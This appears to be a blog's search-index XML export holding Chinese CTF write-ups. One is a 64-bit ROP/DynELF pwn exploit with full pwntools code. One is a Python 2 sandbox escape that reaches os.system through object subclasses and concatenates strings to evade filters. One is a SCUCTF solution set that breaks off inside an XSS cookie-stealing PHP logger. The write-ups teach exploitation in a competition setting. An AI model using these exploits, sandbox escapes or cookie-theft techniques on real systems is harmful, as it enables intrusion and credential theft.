<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[再来一道入门Pwn]]></title>
    <url>%2F2019%2F09%2F04%2F%E5%86%8D%E6%9D%A5%E4%B8%80%E9%81%93%E5%85%A5%E9%97%A8Pwn%2F</url>
    <content type="text"><![CDATA[前言许久过去了，对于Pwn也是有了更深的了解，但是还是处在初级阶段，仅以此记表示正在前行。前置知识这是一个64位程序，所以需要了解一下64位和32位程序的区别。32位程序(8个寄存器)使用栈帧作为参数传递，64位程序(16个寄存器)使用寄存器传递参数。其寄存器rdi,rsi,rdx,rcx,r8,r9分别作为第1-6个参数，rax作为返回值，rbp为通用寄存器。64位没有栈帧指针，32位采用ebp为栈帧指针。需要注意的是，存在这些规则：前六个参数：rdi,rsi,rdx,rcx,r8,r9;r13=rdx=参数3；r14=rsi=参数2；r15d=edi=参数1；r12=call address(调用函数地址)。这道题用到了新知识：DynELF。即在没有libc时，通过泄露程序本身内存地址再经过查询得到libc地址，和libcsearcher道理基本相同。但是这道题没有简单的write函数可以利用，可以使用DynELF穷举后查询(也可以泄露这道题的read()地址，再用libcsearcher查询)。DynELF利用puts()进行地址泄露已经成了一种套路，详情可见此处。开始那么我们首先需要看一下此程序开启了哪些保护机制：分析程序，看到有puts()函数可以利用，还有read()函数，那么我们可以通过read()函数执行puts()函数来泄露地址。同时因为64位程序没有使用栈帧传递参数，所以在调用puts()前需要向rdi赋值，所以我们首先使用命令：ROPgadget --binary pwn-100 --only "pop|ret" | grep rdi得到可存储寄存器的地址，接着后面接上想赋值的地址，再调用puts()即可泄露地址。泄露后即可使用DynELF查找得到system的地址。接着我们发现此程序没有/bin/sh，所以我们还需要自己写入。所以我们还需要找到一段有写权限的地址。在gdb中，运行程序后使用命令：vmmap可以得到可写地址。需要注意的是，rbp,rbx,rsp,r12,r10~r15是需要保护的(非易失的)，即程序结束时，需要恢复其初始值。泄露地址后，现在问题来了，既然参数只能通过寄存器来赋值，那么我们怎么搞呢？这就需要ROP链(将参数传入寄存器)了，我们从汇编代码中看到：程序有可以利用的ROP链，于是先调用pop为寄存器赋值，再mov给参数，接着从图片中看出调用mov后会再次进入pop程序段，此时需要填充字符至ret返回地址，也满足了恢复初值的要求。注意点：v1的偏移不管是从ida口算(0x40+前栈帧0x8)还是使用gdb调试都能得出0x48=72的结果；因为从ida看出程序中puts(‘bye~’)地址比rdi_addr低，所以会先执行puts(‘bye~’)再执行泄露puts()。构造POCfrom pwn import *p=remote(&apos;&apos;,)elf=ELF(&apos;./pwn-100&apos;)puts_addr=elf.symbols[&apos;puts&apos;]read_addr=elf.symbols[&apos;read&apos;]pop_addr=0x40075a #rbx,rbp,r12,r13,r14,r15mov_addr=0x400740 #rdx=r13=argv3,rsi=r14=argv2,edi=r15d=argv1rdi_addr=0x400763bss_addr=0x601000start_addr=0x400550def leek(addr): payload=&apos;a&apos;*0x48+p64(rdi_addr)+p64(addr)+p64(puts_addr)+p64(start_addr) #即执行puts(addr),再返回start。 payload=payload.ljust(200,&apos;0&apos;) #将payload根据程序要求调整至200 p.send(payload) p.recvuntil(&apos;bye~\n&apos;) content=&apos;&apos; last=&apos;&apos; count=0 while True: tmp=p.recv(numb=1,timeout=0.5) #指定接收一字节，指定超时时间0.5s if last==&apos;\n&apos; and tmp==&apos;&apos;: content=content[:-1]+&apos;\x00&apos; break else: content+=tmp last=tmp content=content[:4] log.info(&quot;%#x =&gt; %s&quot; % (addr,(content or &apos;&apos;).encode(&apos;hex&apos;))) return contentlibc=DynELF(leek,elf=elf)system_addr=libc.lookup(&apos;system&apos;,&apos;libc&apos;)payload=&apos;a&apos;*0x48payload+=p64(pop_addr) #进行pop操作payload+=p64(0) #rbx=0，rbx对我们无用，故置0，置1会hack失败payload+=p64(1) #rbp=1，达到调用read()函数的目的payload+=p64(read_addr) #read()函数payload+=p64(8) #read()的参数，读入8字节payload+=p64(bss_addr) #写入地址payload+=p64(1)#r15置1，此时按照前置知识中规则，相当于执行read(1,bss_addr,8)payload+=p64(mov_addr) #赋值，真正执行构造的函数payload+=&apos;\x00&apos;*56 #mov段进入pop段时有7个pop段，64位每个8字节，总共56字节payload+=p64(start_addr)payload=payload.ljust(200,&apos;0&apos;)p.send(payload)p.recvuntil(&apos;bye~\n&apos;)p.send(&apos;/bin/sh\x00&apos;)payload=&apos;a&apos;*0x48+p64(rdi_addr)+p64(bss_addr)+p64(system_addr)payload=payload.ljust(200,&apos;0&apos;)p.send(payload)p.interactive()这道题用sendline会报错，send就没事，找错的时候搞了半天。。。我们也可以只用LibcSearcher来编写代码。]]></content>
      <categories>
        <category>心得小谈</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python2下的沙盒逃逸]]></title>
    <url>%2F2019%2F08%2F05%2Fpython2%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%2F</url>
    <content type="text"><![CDATA[前言最近了解到python的内联函数的强大，利用它，可以实现文件的读写，甚至是执行任意命令，十分地惨无人道。对此十分感兴趣，于是记之。前置知识启动python解释器后，可以使用许多函数，这就是内联函数。内联属性：python中实例化类，系统自动创建的一些属性。__class__：得到实例对应的类；__bases__：得到基类，返回的是元组；__dict__：查看对象内部所有属性名和属性值组成的字典；__subclasses__()：获取子类集合，返回列表；func_globals：包含函数全局变量的字典引用，其中包含许多模块或者函数，例如OS模块。利用我们首先尝试一下如下命令：print [].__class__&lt;type 'list'&gt;print [].__class__.__bases__(&lt;type 'object'&gt;,)print [].__class__.__bases__[0]&lt;type 'object'&gt;print [].__class__.__bases__[0].__subclasses__()我们看到file的下标是40，于是使用[40]选取到它。然后就可以实现文件读写了：print [].__class__.__bases__[0].__subclasses__()[40]('C:\Users\HP\Desktop\hello.txt').read()如果想列出目录是不能够直接执行的，例如：会提示没有权限。那么我们就寻找能够使用的模块。我们选择下标为59的警告信息来输出func_globals：print [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals我们会发现linecache模块里存在OS模块：print [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__接着我们就利用OS模块进行命令执行！想干啥就干啥，例如我们看一下网络配置：print [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['system']('ipconfig')我们现在可以执行任意命令了，只需要更换不同操作系统下不同的命令即可。存在拦截措施下的使用因为func_globals中存在ls这个Linux下列出目录的命令，所以func_globals一般都会被拦截，这个时候就需要__getattribute__出场了。__getattribute__：属性访问拦截器，当类的属性被实例访问时会自动调用类的__getattribute__方法，经过系列操作后，再返回属性处理结果，python中只要定义了了继承object的类，就默认存在属性拦截器，拦截后直接返回。我们可以利用__getattribute__来拼接func_globals：print [].__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')后续操作基本一致，当然，可能需要使用一下拼接字符串的绕过姿势，例如：print [].__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s') #windows下ls换成dirpython沙盒逃逸就到这里，这也是初次接触，有空再研究研究python3下的。]]></content>
      <categories>
        <category>心得小谈</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第一届SCUCTFWP]]></title>
    <url>%2F2019%2F05%2F27%2F%E7%AC%AC%E4%B8%80%E5%B1%8ASCUCTFWP%2F</url>
    <content type="text"><![CDATA[前言时隔两个月再次更新，总算是把一些事情处理得七七八八了。现在就来把上个星期参加的第一届SCUCTF的WP放上来。在此感谢室友2rrrr的两天辛勤付出！Part0 签到0x00 [重要]赛前通知这道题直接提交。Flagscuctf{signup}Part1 Crypto0x01 佛说，让你签个到这是个脑洞题，直接在线解密：http://keyfc.net/bbs/tools/tudoucode.aspx 可以得到：于是按照提示操作得到flag：Flagscuctf{W31c0me_to_scUcTF2ol9}0x02 audiowav格式，直接拖到au里查看频谱:看到下面一长一短，摩斯电码,在线解密，得到flag：Flagscuctf{thisisreallymendokusai}0x03 X计划首先我们看到这是一个Des加密：而且密钥和IV都是随机生成的：接下来nc 47.96.138.65 11001看看服务器的返回:按照题目要求，根据这个明文密文对，输入一个用该密钥和iv加密的密文，使得解密出来明文后四位是XXXX，题目使用的是CBC模式的DES，可以使用字节翻转攻击。关于字节翻转攻击的原理这里不详细讨论，直接进入解题：对于这一组明密文对，明文为两个分组，密文为三个分组，分析脚本:加密时自动填充了一个分组，这里不去管它。把明文分成Z2y6ylcE,P70K5n1A两个分组，要修改第二个分组后四位5n1A为XXXX，需要对密文第一个分组后四位进行异或操作。密文第一个分组的后四位为F6 E0 25 E6，根据字节翻转的公式，直接进行操作：得到新字节 9B D6 4C FF，替换原来的4字节，然后提交给服务器,得到flag:Flagscuctf{b42a7bcd7c369784aa7c27bd689af21d}0x04 512位RSA拿到给的py代码，先看一下：看到一个要求3s内输入，不能手动，只能写脚本来提交。既然如此，先nc 47.96.138.65 11000看看：和想的一样，过了3秒自动断开。分析题目，给了一组参数n,e,d，要求给出p+q的md5值，md5不是什么问题，主要是根据n,e,d解出p和q，其实这也不是问题，Crypto库里面其实有这个功能的实现，直接导入进来使用就行了：最终代码如下：from Crypto.PublicKey import _slowmathimport socketimport hashlib#连接服务器s=socket.socket()host='47.96.138.65'port=11000s.connect((host,port))#过滤得到n,e,d参数tmp=s.recv(20000).decode('ascii').split('L')n=eval(tmp[0][4:])e=eval(tmp[1][5:])d=eval(tmp[2][5:-45])#rsa_construct构造RSA加密器对象tmp=_slowmath.rsa_construct(n,e,d=d)p=tmp.pq=tmp.q#md5md5=hashlib.md5()md5.update(str(p + q))correct_answer = str(md5.hexdigest()).upper()correct_answer.join('\n')s.send(correct_answer)print(s.recv(20000))运行脚本，得到flag：Flagscuctf{89029f10df59cce5dcd812627d2a9964}Part2 Misc0x01 Find Others我们看看拿到的图片，是一张残缺二维码,而且名字是part1.png：用010编译器打开发现是几张png格式的图片凑在一起的。并且还需要补全头部，于是拆分得到四张二维码部分图，将其反色再组合(此处推荐使用Stegsolve直接反色，超级方便)，扫码得到flag:Flagscuctf{yOu_f1x_It_very_g00d}0x02 stream我们解压，发现报错，于是用010看一下，发现头部残缺，于是将其补全：接着再次查看此压缩包，结果发现flag是假的：然而我们发现010打开的时候存在STM:realflag，想到题目名stream，于是想到可能是隐藏了流，于是上AlternateStreamView扫描，得到隐藏的文件realflag.txt。提取之后得到flag：将其提取出来得到flag：Flagscuctf{Th1s_A_s1mpl3_ADS}0x03 协会最强的人是谁拿到图片，发现是JavaScript之父(变强就得变秃)：先上010，没发现啥,但是直接拖到底发现有base64：于是在线解密得到一串加密代码，一看是rot13算法的代码，以及flag经过了des加密，看到最后的conclution(极度怀疑出题方打错了单词)，猜测其是密码，rot13后得到abcdefg，于是直接在线解密des，得到flag，更改形式后提交正确。Flagscuctf{1810fc7a8e865dd5}0x04 藏在最下面的flag发现是川大简介:上Stegsolve扫一下通道，发现有隐写痕迹：于是接下来就是提取数据，没想到题目是这个意思，的确藏在最下面：发现是png格式，将其保存，发现是二维码,不出意外扫描它就能得到flag：扫描它，果然得到flag；Flagscuctf{6ea6688cc99719eb4624eef718719215}0x05 婉姐姐的内存镜像下载后是个vmem镜像，用kali的volatility分析一下:是WinXPSP2x86的系统，题目说刚刚复制了flag，查看一下剪贴板,直接就出来了:Flagscuctf{ec10a7ad0896c0e5562fbba6a1c1808f}0x06 流量分析下载来打开数据包文件，看到是USB流量：usb流量可咋办。。百度了一下，发现有类似的题目，参考了一下解题方法:https://blog.csdn.net/qq_36609913/article/details/78578406 ,按照这个方法，首先把usbdata提取出来:tshark -r xxxxxx_12976f321a1befbf47faa1b94b09c157.pcapng -T fields -e usb.capdata &gt; usbdata.txt看到数据长度是8个字节，说明是键盘的数据，击键数据在第3字节:只要查表就可以得出对应的字符了，文章作者已经写好了脚本，对于这个题目同样适用，直接运行脚本，即得到flag:Flagscuctf{usbliuliangfenxi}Part3 Re这个真的是重头戏了，本WP占最大篇幅的就是Re了。0x01 babyWindows程序，先运行看看：乱输一个，直接退出,然后放进IDA里分析:看到这里没有main函数，搜索一下字符串Input：点开401030函数，F5反汇编，确定这个是main函数:这段代码可以直接看懂，401180和401130分别是printf和scanf，输入的字符串长度为30接下来while循环里做了一个异或操作，再判断是否和内存中的数据相等，相等则输入正确变量v3是输入的字符串，v4是401000生成的一个数据，进入401000分析:是一个递归函数,一开始没看明白是做什么用的，用python对照着写了一下。很明显，函数返回斐波那契数列第n个值,所以目标就是让输入的字符串和斐波那契数列进行异或的值与byte_41C7D4相等:把这段数据dump出来，编写python脚本:from libnum import n2sdef func(num): v1=num if(num==0 or num==1): return num v2=func(num-2) return (v2+func(v1-1))&amp;2**8-1arr=[]for i in range(30): arr.append(func(i+3))c='71 60 70 6B 79 73 59 0E 68 E6 DA 26 17 84 44 28 20 1F 9D 69 C0 53 63 45 1D 35 D9 1C E4 78'.split(' ')c=list(map(lambda x:int('0x'+x,16),c))flag=''print(arr,c)for i in range(30) : flag+=(n2s(arr[i]^c[i]))print(flag)于是得到flag：Flagscuctf{91v3_u_y0ur_F1srt_Fl49}0x02 showme666先运行程序看看:是一个掷骰子程序，必须5个都是6点才能通过，分析程序类型:64位ELF程序，用IDA64打开:随机数是用时间作为种子生成，不可控制。而且还有反作弊机制，666：这一段是最终结果部分，如果掷出5个6点，会调用4006B6函数，进入函数查看:其中有putchar，说明该函数会输入字符，应该就是输出flag:最重要的是该函数没有参数传入，所以只要动态调试直接将函数地址作为IP就能够执行该函数:一路执行到底，输出了flag,要把flag换成scuctf:Flagscuctf{4b54089e328eab73758825a0b40b5be6}0x03 rcrcrcLinux程序，先运行看看:程序没有任何输出，随便输入字符，程序退出，IDA64打开分析:main函数中有scanf和几个变量定义，最终判断四个变量值是否正确,先进入400894查看:其中ROL和部分变量的名字是我自己修改过的，点开ROL很容易分析出这是循环左移函数:看到如下结构，再结合题目名字，基本上可以断定这是一个RC5加密程序：再进入4006FC查看:可以确定是RC5加密，一个分组是int，也就是32位，做12轮循环，400894是密钥扩展函数，4006FC是加密函数，附两页ppt:但与一般的RC5不同的是，该程序每一轮使用的子密钥是一样的:循环变量j作为密钥数组索引，没有修改，要进行解密，首先要获得使用的子密钥，在这里无需对密钥扩展函数进行分析，直接在动态调试中从内存dump出各个子密钥即可：可以得到4个子密钥0xd24aaa79,0x0bf82ac7,0xeb5a5436,0x04fc4110按照密钥的使用顺序，编写解密程序：import libnumdef ror(num,d): tmp=num&gt;&gt;(d&amp;0x1f) return tmp|((num&lt;&lt;(32-(d&amp;0x1f)))&amp;2**32-1)s=[0xd24aaa79,0x0bf82ac7,0xeb5a5436,0x04fc4110]cipher=[0xf4a956bf,0xba568f3d,0xd73a7f7c,0x817f532b]message=[]for r in range(0,3,2): ld=cipher[r] rd=cipher[r+1] for rnd in range(12): rd=ror((rd-s[r+1])&amp;2**32-1,ld)^ld ld=ror((ld-s[r])&amp;2**32-1,rd)^rd rd=(rd-s[1])&amp;2**32-1 ld=(ld-s[0])&amp;2**32-1 message.append(libnum.n2s(ld)) message.append(libnum.n2s(rd))print(message)于是乎运行得到：似乎不是可读的字符串，但确实都落在ASCII范围内，看了半天，注意到linux是小端位序，这个结果也是小端方式输出的，实际flag应该倒过来:Flagscuctf{rc5_fking_boring}0x04 bahaWindows程序，运行看看:两段输入，有错误提示，IDA打开分析,先看看函数：没有main符号，搜索字符串Welcome:进入该main函数查看:其中部分变量名和函数名是自己修改过的，程序首先输入两个字符串，然后对第二次输入进行判断，进入check_is_number函数查看:比较明显的是与48+9=57，也就是’9’的ASCII码，基本上可以得知这个函数是判断是否为数字字符串，但strlen还不太清晰,接下来有一个401060函数，进入查看分析:注意到这里的右移6位，&amp;3F等操作，再结合abcdefg变量:能够判断这是一个base64编码，而其中的字符串是base64编码的结果,但是直接取出来进行base64解码发现并不是可读字符串，注意到sub_401000():这个函数对base64编码表进行了打乱，上动态调试，直接dump出打乱的编码表:编写脚本，查表还原真正的base64编码:origin='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'modified='pj+Oh2IXB6dyV5ArzmDtML0ZkeqPgwfvJbaSEHnxUY79K4Go3u/TC1sl8iFQWcNR'key_enc='kEjTmtB3VtHvgs51kl5v'key=''for ch in key_enc: key+=origin[modified.index(ch)]print(key)运行脚本，得到第一次输入的name：接着在程序中输入，得到正确的结果：接下来看phone:这一段将name和phone连接到了一个字符串中，总长度是24，所以phone的长度应该是9,然后看最后的判断:接下来进入函数查看:函数内有三段循环，第一段循环是32位常量的异或操作，第二段循环是查表操作，第三段循环特征比较明显，有&gt;&gt;5,×16，也就是&lt;&lt;4操作，并且有-0x61c88647=0x9e3779b9常量，是一个tea加密。结合题目名字baha，ba应该代表base64，ha我觉得应该是hash，那么第二段循环应该是一个hash算法，而用查表方式的hash算法，一般就是crc了。仔细分析代码，首先取出第一个字符，与初始寄存器异或得到索引值，寄存器右移8位。通过索引查表得到某个值，再与寄存器异或，寄存器长度是两个双字，所以是一个查表法crc64，第一段循环就是生成表的操作，同样直接在动态调试中dump出这张表即可：有了表后，需要逆向恢复出9个字节内容，因为crc64的长度是8字节，所以第一个字节只能猜测，范围也比较小，在数字字符范围内。恢复的方法参考了：https://blog.csdn.net/dabang_007/article/details/48713659因为正向计算时寄存器先逻辑右移8位，再与一个8字节异或，所以第一个字节与查表得到的值的第一个字节相等，利用这个可以得到表中这一个8字节字的索引。得到第一个8字节字后，寄存器先与这个字异或，再左移8位，然后重复第一次操作，一共可以得到8个8字节字的索引。根据这些索引号，遍历所有的第一个字节，进行一次正向计算，约束后八个字节的输入必须使得查表时的索引号是所期望的值，就能得到每一种符合条件的输入。Tea的解密比较容易，将+改为-，顺序调换即可。最后编写脚本：origin='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'modified='pj+Oh2IXB6dyV5ArzmDtML0ZkeqPgwfvJbaSEHnxUY79K4Go3u/TC1sl8iFQWcNR'key_enc='kEjTmtB3VtHvgs51kl5v'key=''for ch in key_enc: key+=origin[modified.index(ch)]print(key)name='b@sE2019_scucs_'phone=''num='0123456789'data=[0,0,0x30358979,0x7AD870C8,0x606B12F2,0xF5B0E190,0x505E9B8B,0x8F689158,0x9841B68F,0xC038E573,0xA8743FF6,0xBAE095BB,0xF82AA47D,0x358804E3,0xC81F2D04,0x4F50742B,0x6814FE75,0xAB28ECB4,0x5821770C,0xD1F09C7C,0x087FEC87,0x5E980D24,0x384A65FE,0x24407DEC,0xF05548FA,0x6B1009C7,0xC060C183,0x11C8790F,0x903E5A08,0x9EA0E857,0xA00BD371,0xE478989F,0x88BE6F81,0x7D08FF3B,0xB88BE6F8,0x07D08FF3,0xE8D57D73,0x88B81EAB,0xD8E0F40A,0xF2606E63,0x10FFD90E,0xBD301A48,0x20CA5077,0xC7E86A80,0x7094CBFC,0x4880FBD8,0x40A14285,0x32588B10,0xE0AA91F4,0xD620138F,0xD09F188D,0xACF86347,0x80C18306,0x2390F21F,0xB0F40A7F,0x594882D7,0x78EB277B,0x1618F6FC,0x48DEAE02,0x6CC08634,0x18803589,0xE3A8176C,0x28B5BCF0,0x997067A4,0x117CDF02,0xFA11FE77,0x2149567B,0x80C98EBF,0x7117CDF0,0x0FA11FE7,0x41224489,0x75796F2F,0x893D698D,0x3A291B04,0xB908E0F4,0x40F16BCC,0xE9567B7F,0xCF99FA94,0xD963F206,0xB5418A5C,0x79682177,0x513912C3,0x495DA80E,0x2BE1620B,0x19033385,0xA489F353,0x2936BAFC,0xDE51839B,0xE12997F8,0x9101F7B0,0xD11C1E81,0xEBD98778,0x8142850A,0x64B11620,0xB1770C73,0x1E6966E8,0x99C2B083,0x8719014C,0xA9F739FA,0xFDC17184,0xF9A9A271,0x72A9E0DC,0xC99C2B08,0x08719014,0x0183060C,0x4721E43F,0x31B68F75,0x3DF994F7,0x61E814FE,0xB29105AF,0x51DD9D87,0xC8497567,0xF1D64EF6,0x2C31EDF8,0xC1E3C78F,0x56E99D30,0x91BD5C04,0xD9810C68,0xA188D57D,0xA3597CA0,0x6997F879,0xEC09088B,0x59A27100,0x96D17843,0x09FCEA8B,0x19B9E91B,0x39C963F2,0x636199D3,0x7A6E2D6F,0xDF7ADABD,0x4A5BA416,0xA5A2AA75,0x1A053F9D,0x2ACA3B2D,0x2A30B6E4,0x50124BE5,0xE22F9BE0,0x1F423FCE,0xD21A1299,0x659A4F06,0x82448912,0xEAF2DE5E,0xB271006B,0x902AAE96,0x127AD31A,0x74523609,0x224F5A63,0x0E8A46C1,0x7211C1E8,0x81E2D799,0x42244891,0xFB3AA751,0x8A3B6595,0xB46AD37A,0xBA0EECEC,0xCEB2A3B2,0xEA507767,0x41DA32EA,0xDA65FE1E,0x3B024222,0xF2D042EE,0xA2722586,0xC2E5CB97,0xD8AA554E,0x92BB501C,0x57C2C416,0xA28ED965,0x2D1AB4DE,0x6A91F461,0x624AC0F5,0x5AA47D18,0x1892B03D,0x0AFAE693,0x97FA2165,0x3ACF6FEA,0xED2251AD,0x9AC4BC9B,0x095AC932,0xAAF135E2,0x7382B9FA,0xFAAFAE69,0xFCEA28A2,0xCA9A2710,0x8632586A,0x02850A14,0xC9622C41,0x32B0836D,0xB3BA5C89,0x62EE18E6,0x3CD2CDD1,0x52DB919F,0x460ABD19,0x6B12F26D,0x256B24CA,0x5B277B14,0x5FB35402,0x0B79E09F,0xD0DBC55A,0x3B4C69E6,0xAA03B592,0xF35344E2,0xE553C1B9,0xC366CD9B,0x9F8BB171,0x93385610,0x10E32029,0xA30DDF69,0x6A3B50E1,0x03060C18,0x8E43C87E,0x33338561,0xF49BB8B6,0x636D1EEA,0x7BF329EE,0x53589793,0x012B5926,0x9B47BA97,0x4E7B2D0D,0xAB7233EE,0x34A35DC5,0xFB2CA865,0xBBCBCC9D,0xCB19211C,0xC113BC55,0xE3AC9DEC,0x5863DBF1,0xD3991495,0x22BBAB39,0x83C78F1E,0xADD33A61,0xB3F20667,0xD70B4AA9,0x7BED2B63,0x985B3E82,0x4BD8A21A,0xE2834E4A,0x1B863991,0x6DEBDF12,0x2BB3B0E8,0x1733AFDA,0x8BB86399,0xF34B3745,0xBB8DEAE0,0x8993478D,0xEBD3716B,0x06FBD6D5,0xDBE6F812,0x7C23A61D,0x13F9D516,0x3373D236,0x23CC5C6F,0x49ABA2FE,0x7392C7E4,0xC6C333A6,0x43A74E9D,0xBC1B436E,0xAC4BC9B5,0x95AC9329,0x9C7E40CC,0xEF74E3E1,0xCC20DB47,0x601C72B9,0xFC15523E,0x1AC40271,0x340A7F3A,0x5594765A,0x043FF643,0x2F4C0692,0x54616DC8,0xA02497CA,0x6454E4B1,0xDAFCE702,0xC45F37C0,0x3E847F9D,0xF46ABEB9,0x445C0F55,0xA4342532,0xCB349E0D,0x9401AC4B,0xB1ECEEC5,0x5C1E814F,0xFEBC9AEE,0x6C2B0836,0x8464EA26,0x3C7593BD,0x0B0C7B7E,0x0C401AC4,0x71D40BB6,0x24F5A634,0xE8A46C12,0x14C02F4D,0x927C1CDA,0x449EB4C6,0x1D148D82,0x74AB3DBF,0x67CCFD4A,0xBCB410BB,0x289C8961,0x8C8199C2,0x5244F9A9,0xDCDF0249,0xDD2C68F1,0xECEA8B30,0xA7F41839,0x4CE15841,0x438C80A6,0x7CD4D138,0x3954F06E,0x2C8A4AB3,0xB63C6136,0x1CBFC3CA,0xCCE411FE,0xD4A0EECE,0x83B465D5,0xE49567B7,0xF96C151D,0xB4CBFC3C,0x76048445,0x84FE7545,0x0CDCF48D,0xBD3716B7,0x6FBD6D5E,0x8D029FCE,0x15651D96,0xDD5C0445,0x9A0D8CCE,0xED698D3C,0xE0D5FC06,0x2576A038,0xAF85882D,0x15432941,0xD55DF8E5,0x451DB2CA,0x5A3569BD,0x75283BB3,0x20ED1975,0xD523E8C2,0xC49581EA,0xE51661BB,0xBE4DF122,0xB548FA30,0x3125607A,0x857D7349,0x4BFD10B2,0x4D625E4D,0x04AD6499,0x7D57D734,0x7E751451,0x2D094CBF,0xF11D8509,0x1D3CC5C6,0x8BC5F5C1,0x35897936,0x12B59265,0x05BCF04F,0x686DE2AD,0x55E26BC4,0xE70573F5,0x65D7E2BD,0x9DDD033D,0xADC8CFB9,0xD28D7716,0x9DFD46C0,0xA85507DE,0xCDA3DD4B,0x273D9686,0xFD965432,0x5DE5E64E,0x5D9D8743,0xB99D7ED1,0x6DA80E3A,0xC3450E19,0x3DF695B1,0x4C2D9F41,0x0DC31CC8,0x36F5EF89,0xC5DC31CC,0x79A59BA2,0xF5E9B8B5,0x037DEB6A,0xA5B7233E,0x8C157A32,0x9582AA47,0xF6CD0AFA,0xD625E4DA,0x4AD64994,0xE6106DA3,0x300E395C,0xB64EF628,0xBF66A804,0x867B7F51,0xC5BED8CC,0x4E645255,0x8AEEACE7,0x7E51DB2C,0xF036DC2F,0x2E0F40A7,0x7F5E4D77,0x1E3AC9DE,0x05863DBF,0xBE311AAF,0xE1FEA520,0x8E0493D6,0x9B26D5E8,0xDE5A085D,0x144E44B0,0xEE6F8124,0x6E963478,0x2670AC20,0x21C64053,0x16452559,0x5B1E309B,0x461BBED2,0xD476A1C3,0x762E37AB,0xAEAED10B,0x5E9B8B5B,0x37DEB6AF,0x6EAE0222,0x4D06C667,0x3EF099A9,0xC26E573F,0x0EC510D0,0xB8B627F7,0xC6DA3DD4,0xF7E653DC,0xF6EFB4AD,0x8D3E2314,0xA6B12F26,0x0256B24C,0x9684A65F,0x788EC284,0x368F752E,0x9CF65A1B,0x06BAFC57,0xE62E2AD3,0x56E467DC,0x6946BB8B,0x66D1EEA5,0x139ECB43,0xAECEC3A1,0x5CCEBF68,0x9EFB4AD8,0x2616CFA0,0xCEA5D153,0xA97E5EF8,0xFE90582A,0xD3A62E30,0xC7593BD8,0xB0C7B7E3,0xF76CB2A1,0xCA1FC72B,0xA732292A,0x45775673,0x9707A053,0x3FAF26BB,0x5F188D57,0x70FF5290,0x6F2D042E,0x0A272258,0x3F739FA5,0x854FB300,0x0F4616DC,0xFF97C3C8,0xAF4DC5AD,0x1BEF5B57,0x9F784CD4,0x61372B9F,0xCF26D75F,0xEE5FBAC7,0xFF135E26,0x9487CA0F,0x370C7322,0xDBD7BE24,0x0739FA5B,0xA10FCEEC,0x576761D0,0x2E675FB4,0x6752E8A9,0x54BF2F7C,0x4FE75459,0xCDCF48D8,0x7FD2DD20,0xB7173810,0x2F8C46AB,0x387FA948,0x1FB9CFD2,0x42A7D980,0xD7A6E2D6,0x0DF7ADAB,0xE7936BAF,0x772FDD63,0xB7CDF024,0xF8474C3B,0x87F8795D,0x829F3CF3,0x27F3AA2C,0x66E7A46C,0x17C62355,0x1C3FD4A4,0x4798B8DE,0x935745FC,0x77AD31A7,0xE98F3534,0xBFB21CA3,0xA6DF411F,0x8F8795DA,0xDC0731D7,0xDFD90E51,0x536FA08F,0xEFEC8728,0x29B7D047]k=[0x2175da3a,-0x4c241d25,0x149b411,-0x2b15395b]delta=0x9e3779b9summary=0xc6ef3720result=[0x26e17720,0x81814336]for r in range(32): result[1]-=((summary+result[0])&amp;0xffffffff) ^ (((result[0]&gt;&gt;5)-0x2b15395b)&amp;0xffffffff) ^ (((result[0]&lt;&lt;4)+0x149b411)&amp;0xffffffff) result[1]&amp;=0xffffffff result[0]-=((summary+result[1])&amp;0xffffffff) ^ (((result[1]&gt;&gt;5)-0x4c241d25)&amp;0xffffffff) ^ (((result[1]&lt;&lt;4)+0x2175da3a)&amp;0xffffffff) result[0]&amp;=0xffffffff summary-=deltaprint('ans=',map(hex,result))for ch in name: v14=origin[0]^ord(ch) index=2*(v14&amp;0xff) origin[0]=(origin[0]&gt;&gt;8)+((origin[1]&amp;0xff)&lt;&lt;24) origin[1]&gt;&gt;=8 origin[0]^=data[index] origin[1]^=data[index+1]print('origin=',map(hex,origin))blks=[]for r in range(8): e=result[1]&amp;0xff000000 for i in range(len(data)): if e==data[i]&amp;0xff000000 and i%2==1: blks.append(i) result[1]=((((result[1]^data[i]))&lt;&lt;8)&amp;0xffffffff) print(map(hex,result)) result[0]=(result[0]^data[i-1])&amp;0xffffffff result[1]+=(result[0]&amp;0xff000000)&gt;&gt;24 result[0]=(result[0]&lt;&lt;8)&amp;0xffffffffprint(map(lambda x:hex(data[x]),blks))for n in num: origin=[0x424fa357, 0x3f6a6fab] ind=[] number='' for i in range(len(blks)+1): if i==0: v14=origin[0]^ord(n) index=2*(v14&amp;0xff) number+=n else: index=blks[len(blks)-i]-1 number+=(chr((origin[0]^(index/2))&amp;0xff)) origin[0]=(origin[0]&gt;&gt;8)+((origin[1]&amp;0xff)&lt;&lt;24) origin[1]&gt;&gt;=8 origin[0]^=data[index] origin[1]^=data[index+1] print('n=',n,' i=',i,map(hex,origin),number) print(map(hex,origin))可以看到201914153是符合条件的输入:所以最终flag为两端输入拼起来。Flagscuctf{b@sE2019_scucs_201914153}part4 Web0x01 来了老弟？进入链接，发现啥都没有，看了看图片，进行了一番分析，无果。于是怀疑页内跳转，查看数据包，发现：将其base64解密得到flag。Flagscuctf{y0U_jUs7_neEd_car3ful}0x02 简单的XSS拿到链接，发现link1的的确确会访问我们输入的网址，link2是个老实巴交的网站，随便XSS，这种dom型xss明显是cookie处入手，于是考虑在link1处填入link2经过xss后可以跳转到记录cookie的站点的url，可以写出记录cookie的脚本，部署于服务器：&lt;?php$cookie = $_GET['cookie']; $ip = getenv ('REMOTE_ADDR'); $time=date('Y-m-d g:i:s'); $referer=getenv ('HTTP_REFERER'); $agent = $_SERVER['HTTP_USER_AGENT']; 